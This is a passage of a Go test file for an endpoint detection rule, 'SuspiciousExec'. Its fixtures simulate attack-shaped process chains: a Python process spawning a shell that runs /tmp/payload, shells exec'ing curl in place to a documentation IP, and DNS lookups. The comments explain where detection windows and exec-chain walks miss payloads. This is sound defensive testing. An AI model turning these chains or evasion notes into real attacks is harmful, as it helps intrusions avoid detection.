		{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh","-c","..."],"uid":501,"gid":20}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, batch1))
	materialize(t, s, batch1)
	rule := &SuspiciousExec{}
	findings1, err := rule.Evaluate(ctx, batch1, s.GraphReader())
	require.NoError(t, err)
	require.Empty(t, findings1, "no temp-binary in batch 1: rule must not fire")

	// Batch 2: only the temp-binary exec arrives. The python3 + sh ancestors are already in the store (materialised by batch 1) so the
	// reverse-walk from temp-exec finds them.
	batch2 := []api.Event{
		{EventID: "fork-payload", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "exec-payload", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/tmp/payload","args":["/tmp/payload"],"uid":501,"gid":20}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, batch2))
	materialize(t, s, batch2)
	findings2, err := rule.Evaluate(ctx, batch2, s.GraphReader())
	require.NoError(t, err)
	require.Len(t, findings2, 1, "temp-binary exec in batch 2 must walk up to python3 → sh from batch 1")
	assert.Equal(t, "Suspicious exec chain", findings2[0].Title)
	assert.Contains(t, findings2[0].Description, "/usr/bin/python3")
	assert.Contains(t, findings2[0].Description, "/bin/sh")
	assert.Contains(t, findings2[0].Description, "/tmp/payload")
}

// TestGlobMatch pins the wildcard matcher behind the version-agnostic parent allowlist. `*` matches any run of characters INCLUDING
// the path separator (unlike a shell glob), and a pattern with no `*` is exact equality. The evidence-host patterns from issue #391
// (`*/claude/versions/*`, `*/lefthook_*`, the Homebrew Cellar git path) are pinned as named cases.
// TestSuspiciousExec_ParentAllowlistGlobMatching covers the version-agnostic parent exclusion: a glob entry suppresses a
// version-stamped developer-tool parent (the issue #391 noise), while a literal entry keeps exact-match semantics. The glob
// matching itself lives in the resolver (api.GlobMatch / api.MatchExclusionValue) and is unit-tested in the rules/api package; this
// test pins the rule -> resolver wiring end to end.
//
// spec:server-detection-rules-engine/version-agnostic-parent-allowlist-matching/a-glob-allowlist-entry-suppresses-a-version-stamped-parent
// spec:server-detection-rules-engine/version-agnostic-parent-allowlist-matching/a-literal-allowlist-entry-still-matches-exactly
func TestSuspiciousExec_ParentAllowlistGlobMatching(t *testing.T) {
	t.Parallel()

	// claude (version-stamped path) -> /bin/sh -> curl -> outbound to a public address: the dominant benign shape on the pilot host.
	makeEvents := func(parentPath string) []api.Event {
		return []api.Event{
			{EventID: "fork-parent", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
				Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
			{EventID: "exec-parent", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
				Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"` + parentPath + `","args":["claude"],"uid":501,"gid":20}`)},
			{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
				Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
			{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
				Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh","-c","curl ..."],"uid":501,"gid":20}`)},
			{EventID: "fork-curl", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
				Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
			{EventID: "exec-curl", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
				Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/usr/bin/curl","args":["curl","https://github.com"],"uid":501,"gid":20}`)},
			{EventID: "net-curl", HostID: "host-a", TimestampNs: 3500, EventType: "network_connect",
				Payload: json.RawMessage(`{"pid":200,"path":"/usr/bin/curl","uid":501,"protocol":"tcp","direction":"outbound","local_address":"10.0.1.5","local_port":54321,"remote_address":"140.82.112.3","remote_port":443,"remote_hostname":"github.com"}`)},
		}
	}

	const versionStampedParent = "/Users/dev/.local/share/claude/versions/2.1.178/claude"

	t.Run("glob entry suppresses a version-stamped parent", func(t *testing.T) {
		t.Parallel()
		s := openCatalogStore(t)
		ctx := t.Context()
		events := makeEvents(versionStampedParent)
		require.NoError(t, s.InsertEvents(ctx, events))
		materialize(t, s, events)

		rule := &SuspiciousExec{Exclusions: &fakeExclusions{entries: []fakeExcl{
			{ruleID: "suspicious_exec", matchType: api.ExclusionMatchParentPathGlob, value: "*/claude/versions/*"},
		}}}
		findings, err := rule.Evaluate(ctx, events, s.GraphReader())
		require.NoError(t, err)
		assert.Empty(t, findings, "version-stamped parent must match the glob exclusion entry")
	})

	t.Run("glob entry does not suppress a non-matching parent", func(t *testing.T) {
		t.Parallel()
		s := openCatalogStore(t)
		ctx := t.Context()
		events := makeEvents(versionStampedParent)
		require.NoError(t, s.InsertEvents(ctx, events))
		materialize(t, s, events)

		// A glob for a DIFFERENT tool must not suppress the claude chain.
		rule := &SuspiciousExec{Exclusions: &fakeExclusions{entries: []fakeExcl{
			{ruleID: "suspicious_exec", matchType: api.ExclusionMatchParentPathGlob, value: "*/lefthook_*"},
		}}}
		findings, err := rule.Evaluate(ctx, events, s.GraphReader())
		require.NoError(t, err)
		require.Len(t, findings, 1, "non-matching glob must leave the rule firing")
		assert.Contains(t, findings[0].Description, versionStampedParent)
	})

	t.Run("literal entry still matches exactly", func(t *testing.T) {
		t.Parallel()
		s := openCatalogStore(t)
		ctx := t.Context()
		parent := "/usr/libexec/sshd-session"
		events := makeEvents(parent)
		require.NoError(t, s.InsertEvents(ctx, events))
		materialize(t, s, events)

		rule := &SuspiciousExec{Exclusions: &fakeExclusions{entries: []fakeExcl{
			{ruleID: "suspicious_exec", matchType: api.ExclusionMatchParentPathGlob, value: parent},
		}}}
		findings, err := rule.Evaluate(ctx, events, s.GraphReader())
		require.NoError(t, err)
		assert.Empty(t, findings, "literal entry must match the parent path exactly")
	})
}

// TestSuspiciousExec_LocalResolverDNSDeNoising covers the network-arm DNS de-noising: an outbound DNS lookup to the host's
// local-resolver-class address (the Tailscale MagicDNS case from issue #391) is not a triggering connection, while a DNS lookup to a
// publicly routable resolver still fires.
//
// spec:server-detection-rules-engine/local-resolver-dns-suppression-for-the-network-arm/outbound-dns-to-a-local-resolver-does-not-count-as-a-network-connection
// spec:server-detection-rules-engine/local-resolver-dns-suppression-for-the-network-arm/outbound-dns-to-a-public-resolver-still-fires
func TestSuspiciousExec_LocalResolverDNSDeNoising(t *testing.T) {
	t.Parallel()

	// python3 -> /bin/sh -> dig -> outbound UDP :53. The destination address is the only thing that varies between subtests.
	makeEvents := func(remoteAddress string, remotePort int) []api.Event {
		netPayload := fmt.Sprintf(
			`{"pid":200,"path":"/usr/bin/dig","uid":501,"protocol":"udp","direction":"outbound","local_address":"10.0.1.5","local_port":54321,"remote_address":%q,"remote_port":%d}`,
			remoteAddress, remotePort,
		)
		return []api.Event{
			{EventID: "fork-py", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
				Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
			{EventID: "exec-py", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
				Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
			{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
				Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
			{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
				Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh","-c","dig ..."],"uid":501,"gid":20}`)},
			{EventID: "fork-dig", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
				Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
			{EventID: "exec-dig", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
				Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/usr/bin/dig","args":["dig","github.com"],"uid":501,"gid":20}`)},
			{EventID: "net-dig", HostID: "host-a", TimestampNs: 3500, EventType: "network_connect",
				Payload: json.RawMessage(netPayload)},
		}
	}

	t.Run("outbound DNS to a local resolver does not count as a network connection", func(t *testing.T) {
		t.Parallel()
		s := openCatalogStore(t)
		ctx := t.Context()
		// 100.100.100.100 is Tailscale MagicDNS, in the CGNAT 100.64.0.0/10 range.
		events := makeEvents("100.100.100.100", 53)
		require.NoError(t, s.InsertEvents(ctx, events))
		materialize(t, s, events)

		rule := &SuspiciousExec{}
		findings, err := rule.Evaluate(ctx, events, s.GraphReader())
		require.NoError(t, err)
		assert.Empty(t, findings, "DNS to the local resolver must not trigger the network arm")
	})

	t.Run("outbound DNS to a private RFC1918 resolver does not count", func(t *testing.T) {
		t.Parallel()
		s := openCatalogStore(t)
		ctx := t.Context()
		events := makeEvents("192.168.1.1", 53)
		require.NoError(t, s.InsertEvents(ctx, events))
		materialize(t, s, events)

		rule := &SuspiciousExec{}
		findings, err := rule.Evaluate(ctx, events, s.GraphReader())
		require.NoError(t, err)
		assert.Empty(t, findings, "DNS to a private-range resolver must not trigger the network arm")
	})

	t.Run("outbound DNS to a public resolver still fires", func(t *testing.T) {
		t.Parallel()
		s := openCatalogStore(t)
		ctx := t.Context()
		// 8.8.8.8 is a publicly routable resolver: DNS tunnelling to an external resolver must still surface.
		events := makeEvents("8.8.8.8", 53)
		require.NoError(t, s.InsertEvents(ctx, events))
		materialize(t, s, events)

		rule := &SuspiciousExec{}
		findings, err := rule.Evaluate(ctx, events, s.GraphReader())
		require.NoError(t, err)
		require.Len(t, findings, 1, "DNS to a public resolver must still trigger the network arm")
		assert.Equal(t, "Suspicious exec chain", findings[0].Title)
		assert.Contains(t, findings[0].Description, "8.8.8.8:53")
	})

	t.Run("outbound to a local-range address on a non-DNS port still fires", func(t *testing.T) {
		t.Parallel()
		s := openCatalogStore(t)
		ctx := t.Context()
		// The de-noising is DNS-only: a connection to a private address on :443 is not name resolution and must still fire.
		events := makeEvents("192.168.1.10", 443)
		require.NoError(t, s.InsertEvents(ctx, events))
		materialize(t, s, events)

		rule := &SuspiciousExec{}
		findings, err := rule.Evaluate(ctx, events, s.GraphReader())
		require.NoError(t, err)
		require.Len(t, findings, 1, "non-DNS port must not be de-noised even to a private address")
	})

	t.Run("outbound DNS to a loopback resolver does not count", func(t *testing.T) {
		t.Parallel()
		s := openCatalogStore(t)
		ctx := t.Context()
		events := makeEvents("127.0.0.1", 53)
		require.NoError(t, s.InsertEvents(ctx, events))
		materialize(t, s, events)

		rule := &SuspiciousExec{}
		findings, err := rule.Evaluate(ctx, events, s.GraphReader())
		require.NoError(t, err)
		assert.Empty(t, findings, "DNS to a loopback resolver must not trigger the network arm")
	})

	t.Run("outbound DNS to a zoned IPv6 link-local resolver does not count", func(t *testing.T) {
		t.Parallel()
		s := openCatalogStore(t)
		ctx := t.Context()
		// Scoped IPv6 literal with a zone suffix, exactly as the agent emits for mDNS on :53 (present in the demo corpus).
		// net.ParseIP rejects the zone; netip.ParseAddr accepts it, so the de-noiser must still classify it as local.
		events := makeEvents("fe80::842f:57ff:fe06:1564%en0", 53)
		require.NoError(t, s.InsertEvents(ctx, events))
		materialize(t, s, events)

		rule := &SuspiciousExec{}
		findings, err := rule.Evaluate(ctx, events, s.GraphReader())
		require.NoError(t, err)
		assert.Empty(t, findings, "zoned IPv6 link-local DNS must be de-noised")
	})

	t.Run("outbound DNS to an unparseable remote address still fires", func(t *testing.T) {
		t.Parallel()
		s := openCatalogStore(t)
		ctx := t.Context()
		// A remote_address that is not an IP literal cannot be classified as local-resolver-class, so the rule still fires.
		events := makeEvents("resolver.example.invalid", 53)
		require.NoError(t, s.InsertEvents(ctx, events))
		materialize(t, s, events)

		rule := &SuspiciousExec{}
		findings, err := rule.Evaluate(ctx, events, s.GraphReader())
		require.NoError(t, err)
		require.Len(t, findings, 1, "an unparseable remote address must not be de-noised")
	})
}

// A shell that execs its payload IN PLACE leaves no shell in the connecting process's ancestry: the re-exec closed the shell's
// generation at that same PID, so the PPID walk steps over it and returns the interactive login shell above, which fails the window.
// The network arm therefore has to consult the PID's own exec chain, exactly as the exec arm does (issue #713).
//
// Which shell the attacker picked decided whether the payload was seen at all. Measured on macOS 26.6.1, zsh replaces itself with the
// payload while bash and sh fork it, so the zsh form of an identical command was invisible and the bash form was detected.
// spec:server-detection-rules-engine/network-arm-resolves-a-shell-that-exec-d-its-payload-in-place/a-shell-execs-its-payload-in-place-and-the-payload-connects-out
// spec:server-detection-rules-engine/network-arm-resolves-a-shell-that-exec-d-its-payload-in-place/the-shell-on-the-exec-chain-is-outside-the-window
// spec:server-detection-rules-engine/network-arm-resolves-a-shell-that-exec-d-its-payload-in-place/a-re-exec-with-no-shell-on-the-chain-does-not-fire
func TestSuspiciousExecDetectsShellThatExecsPayloadInPlace(t *testing.T) {
	t.Parallel()

	// An interactive login shell exec'd long before the run, so it is the nearest shell in the PPID chain and is far outside the
	// window. It is what the walk used to return, and what made the miss look like "no shell found".
	const (
		loginZshExec = int64(650)
		pyExec       = int64(1_000_000_000_100)
		shellExec    = int64(1_000_000_001_100)
		payloadExec  = int64(1_000_000_002_000)
		flowAt       = int64(1_000_000_002_500)
	)
	base := []api.Event{
		{EventID: "fork-login", HostID: "h", TimestampNs: 500, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":10,"parent_pid":1}`)},
		{EventID: "exec-login", HostID: "h", TimestampNs: 550, EventType: "exec",
			Payload: json.RawMessage(`{"pid":10,"ppid":1,"path":"/usr/bin/login","args":["login"],"uid":0,"gid":0}`)},
		{EventID: "fork-zsh", HostID: "h", TimestampNs: 600, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":20,"parent_pid":10}`)},
		{EventID: "exec-zsh", HostID: "h", TimestampNs: loginZshExec, EventType: "exec",
			Payload: json.RawMessage(`{"pid":20,"ppid":10,"path":"/bin/zsh","args":["-zsh"],"uid":501,"gid":20}`)},
		{EventID: "fork-py", HostID: "h", TimestampNs: 1_000_000_000_000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":20}`)},
		{EventID: "exec-py", HostID: "h", TimestampNs: pyExec, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":20,"path":"/usr/bin/python3","args":["python3","-c","..."],"uid":501,"gid":20}`)},
		{EventID: "fork-stage", HostID: "h", TimestampNs: 1_000_000_001_000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
	}

	execEvt := func(id string, ts int64, pid, ppid int, path string) api.Event {
		return api.Event{EventID: id, HostID: "h", TimestampNs: ts, EventType: "exec",
			Payload: json.RawMessage(fmt.Sprintf(`{"pid":%d,"ppid":%d,"path":%q,"args":[%q],"uid":501,"gid":20}`, pid, ppid, path, path))}
	}
	flowEvt := func(ts int64, pid int) api.Event {
		return api.Event{EventID: "net-payload", HostID: "h", TimestampNs: ts, EventType: "network_connect",
			Payload: json.RawMessage(fmt.Sprintf(
				`{"pid":%d,"path":"/usr/bin/curl","uid":501,"protocol":"tcp","direction":"outbound",`+
					`"remote_address":"198.51.100.42","remote_port":443}`, pid))}
	}

	cases := []struct {
		name      string
		stage     []api.Event
		flow      api.Event
		wantShell string // empty means no finding
	}{
		{
			// The reported miss. zsh execs curl at its own PID, so nothing in curl's ancestry is a shell.
			name: "zsh execs the payload in place",
			stage: []api.Event{
				execEvt("exec-shell", shellExec, 100, 50, "/bin/zsh"),
				execEvt("exec-payload", payloadExec, 100, 50, "/usr/bin/curl"),
			},
			flow:      flowEvt(flowAt, 100),
			wantShell: "/bin/zsh",
		},
		{
			name: "bash execs the payload in place",
			stage: []api.Event{
				execEvt("exec-shell", shellExec, 100, 50, "/bin/bash"),
				execEvt("exec-payload", payloadExec, 100, 50, "/usr/bin/curl"),
			},
			flow:      flowEvt(flowAt, 100),
			wantShell: "/bin/bash",
		},
		{
			// The shape that already worked, kept alongside so a regression in either is visible in one run.
			name: "shell forks the payload",
			stage: []api.Event{
				execEvt("exec-shell", shellExec, 100, 50, "/bin/bash"),
				{EventID: "fork-payload", HostID: "h", TimestampNs: payloadExec - 100, EventType: "fork",
					Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
				execEvt("exec-payload", payloadExec, 200, 100, "/usr/bin/curl"),
			},
			flow:      flowEvt(flowAt, 200),
			wantShell: "/bin/bash",
		},
		{
			// The chain is consulted, but the shell on it is stale, so the window still governs. Without this the new arm would be
			// a way around the 30-second bound rather than a way to see through a re-exec.
			name: "the shell on the chain is outside the window",
			stage: []api.Event{
				execEvt("exec-shell", shellExec, 100, 50, "/bin/zsh"),
				execEvt("exec-payload", payloadExec, 100, 50, "/usr/bin/curl"),
			},
			flow:      flowEvt(shellExec+40_000_000_000, 100),
			wantShell: "",
		},
		{
			// A re-exec with no shell anywhere on the chain must stay silent: the arm looks for a shell, not for any re-exec.
			name: "a non-shell re-execs into another non-shell",
			stage: []api.Event{
				execEvt("exec-shell", shellExec, 100, 50, "/usr/bin/perl"),
				execEvt("exec-payload", payloadExec, 100, 50, "/usr/bin/curl"),
			},
			flow:      flowEvt(flowAt, 100),
			wantShell: "",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			s := openCatalogStore(t)
			ctx := t.Context()
			events := append(append([]api.Event{}, base...), tc.stage...)
			events = append(events, tc.flow)
			require.NoError(t, s.InsertEvents(ctx, events))
			materialize(t, s, events)

			findings, err := (&SuspiciousExec{}).Evaluate(ctx, events, s.GraphReader())
			require.NoError(t, err)
			if tc.wantShell == "" {
				require.Empty(t, findings)
				return
			}
			require.Len(t, findings, 1)
			assert.Contains(t, findings[0].Description, tc.wantShell, "the finding names the shell that ran the payload")
			assert.Contains(t, findings[0].Description, "198.51.100.42:443")
			assert.Contains(t, findings[0].EventIDs, "net-payload")
		})
	}
}

// Shell-to-shell layering is not the boundary this rule fires on, and that holds for a shell found on the exec chain exactly as it
// does for one found in the PPID chain: an interactive shell that forks a shell which then execs the payload in place is a user
// running a command, not a non-shell process reaching for one.
func TestSuspiciousExecSkipsShellToShellOnTheExecChain(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	// login → zsh (interactive, PID 20) → bash (PID 100) → bash execs curl at its own PID → outbound.
	events := []api.Event{
		{EventID: "fork-login", HostID: "h2", TimestampNs: 500, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":10,"parent_pid":1}`)},
		{EventID: "exec-login", HostID: "h2", TimestampNs: 550, EventType: "exec",
			Payload: json.RawMessage(`{"pid":10,"ppid":1,"path":"/usr/bin/login","args":["login"],"uid":0,"gid":0}`)},
		{EventID: "fork-zsh", HostID: "h2", TimestampNs: 600, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":20,"parent_pid":10}`)},
		{EventID: "exec-zsh", HostID: "h2", TimestampNs: 650, EventType: "exec",
			Payload: json.RawMessage(`{"pid":20,"ppid":10,"path":"/bin/zsh","args":["-zsh"],"uid":501,"gid":20}`)},
		{EventID: "fork-bash", HostID: "h2", TimestampNs: 1_000_000_001_000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":20}`)},
		{EventID: "exec-bash", HostID: "h2", TimestampNs: 1_000_000_001_100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":20,"path":"/bin/bash","args":["bash","-c","curl x"],"uid":501,"gid":20}`)},
		{EventID: "exec-curl", HostID: "h2", TimestampNs: 1_000_000_002_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":20,"path":"/usr/bin/curl","args":["curl","x"],"uid":501,"gid":20}`)},
		{EventID: "net-curl", HostID: "h2", TimestampNs: 1_000_000_002_500, EventType: "network_connect",
			Payload: json.RawMessage(
				`{"pid":100,"path":"/usr/bin/curl","uid":501,"protocol":"tcp","direction":"outbound",` +
					`"remote_address":"198.51.100.42","remote_port":443}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	findings, err := (&SuspiciousExec{}).Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	assert.Empty(t, findings, "the shell on the chain is parented by another shell, so this is layering rather than the rule's shape")
}

// A flow whose process has not been materialised yields nothing rather than an error: unlike dns_c2_beacon, this rule does not treat
// the miss as retryable, and the arm must not fire on a chain it cannot anchor to a connecting process.
func TestSuspiciousExecNetworkArmSkipsUnmaterialisedFlowProcess(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	events := []api.Event{
		{EventID: "net-orphan", HostID: "h3", TimestampNs: 1_000_000_002_500, EventType: "network_connect",
			Payload: json.RawMessage(
				`{"pid":4242,"path":"/usr/bin/curl","uid":501,"protocol":"tcp","direction":"outbound",` +
					`"remote_address":"198.51.100.42","remote_port":443}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	findings, err := (&SuspiciousExec{}).Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	assert.Empty(t, findings)
}

// A store failure while walking the exec chain must surface rather than read as "no shell here", which would turn a transient
// database error into a silent detection miss of exactly the payload class the chain walk exists to catch.
func TestSuspiciousExecNetworkArmPropagatesExecChainError(t *testing.T) {
	t.Parallel()
	ctx := t.Context()
	wantErr := errors.New("exec chain unavailable")

	events := []api.Event{
		{EventID: "net-curl", HostID: "h4", TimestampNs: 1_000_000_002_500, EventType: "network_connect",
			Payload: json.RawMessage(
				`{"pid":100,"path":"/usr/bin/curl","uid":501,"protocol":"tcp","direction":"outbound",` +
					`"remote_address":"198.51.100.42","remote_port":443}`)},
	}
	gr := &execChainErrReader{stubBlockGraphReader: &stubBlockGraphReader{exists: true, procID: 7}, chainErr: wantErr}
	_, err := (&SuspiciousExec{}).Evaluate(ctx, events, gr)
	require.ErrorIs(t, err, wantErr)
}

// execChainErrReader resolves processes normally but fails the exec-chain walk, which is the one dependency the network arm's second
// stage adds. It embeds the package's existing stub rather than restating the whole GraphReader surface.
type execChainErrReader struct {
	*stubBlockGraphReader
	chainErr error
}

func (r *execChainErrReader) GetExecChain(_ context.Context, _ api.Process) ([]api.Process, error) {
	return nil, r.chainErr
}

// `zsh -c 'bash -c "curl ..."'` puts TWO shells on one PID's exec chain, both having exec'd in place. The shell that ran the payload
// is the newest one, and GetExecChain returns the chain oldest-first, so walking it forward hands back the stalest shell. Here the
// outer zsh is outside the window and the inner bash is inside it, so getting the direction wrong does not merely misattribute the
// finding, it drops the alert.
func TestSuspiciousExecPrefersTheNewestShellOnTheExecChain(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	const flowAt = int64(1_000_000_000_000)
	events := []api.Event{
		{EventID: "fork-py", HostID: "h5", TimestampNs: flowAt - 60_000_000_000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: "h5", TimestampNs: flowAt - 59_000_000_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["python3"],"uid":501,"gid":20}`)},
		{EventID: "fork-stage", HostID: "h5", TimestampNs: flowAt - 45_000_000_000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		// The outer shell, 40s before the flow, so outside the 30s window.
		{EventID: "exec-zsh", HostID: "h5", TimestampNs: flowAt - 40_000_000_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/zsh","args":["zsh","-c","bash -c curl"],"uid":501,"gid":20}`)},
		// The inner shell replaces it in place, 10s before the flow, so inside the window.
		{EventID: "exec-bash", HostID: "h5", TimestampNs: flowAt - 10_000_000_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/bash","args":["bash","-c","curl x"],"uid":501,"gid":20}`)},
		{EventID: "exec-curl", HostID: "h5", TimestampNs: flowAt - 1_000_000_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/usr/bin/curl","args":["curl","x"],"uid":501,"gid":20}`)},
		{EventID: "net-curl", HostID: "h5", TimestampNs: flowAt, EventType: "network_connect",
			Payload: json.RawMessage(
				`{"pid":100,"path":"/usr/bin/curl","uid":501,"protocol":"tcp","direction":"outbound",` +
					`"remote_address":"198.51.100.42","remote_port":443}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	findings, err := (&SuspiciousExec{}).Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	require.Len(t, findings, 1, "the newest shell on the chain is inside the window, so the alert must be raised")
	assert.Contains(t, findings[0].Description, "/bin/bash", "the shell that ran the payload is the newest on the chain, not the first")
}

// A shell on the chain whose own parent is not in the graph yet is incomplete ancestry, and the rule defers rather than firing. The
// finding would otherwise name an "(unknown)" parent, and an operator's parent exclusion cannot suppress a parent that was never
// resolved, so a rule they had deliberately configured would be bypassed. The PPID walk defers on the same condition.
func TestSuspiciousExecDefersWhenTheChainShellsParentIsMissing(t *testing.T) {
	t.Parallel()
	s := openCatalogStore(t)
	ctx := t.Context()

	const flowAt = int64(1_000_000_000_000)
	// PID 100 execs bash with no fork and a parent that never appears in the graph, then replaces itself with curl.
	events := []api.Event{
		{EventID: "exec-bash", HostID: "h6", TimestampNs: flowAt - 10_000_000_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":999,"path":"/bin/bash","args":["bash","-c","curl x"],"uid":501,"gid":20}`)},
		{EventID: "exec-curl", HostID: "h6", TimestampNs: flowAt - 1_000_000_000, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":999,"path":"/usr/bin/curl","args":["curl","x"],"uid":501,"gid":20}`)},
		{EventID: "net-curl", HostID: "h6", TimestampNs: flowAt, EventType: "network_connect",
			Payload: json.RawMessage(
				`{"pid":100,"path":"/usr/bin/curl","uid":501,"protocol":"tcp","direction":"outbound",` +
					`"remote_address":"198.51.100.42","remote_port":443}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	findings, err := (&SuspiciousExec{}).Evaluate(ctx, events, s.GraphReader())
	require.NoError(t, err)
	assert.Empty(t, findings, "ancestry is incomplete, so the rule defers rather than firing on an unresolvable parent")
}
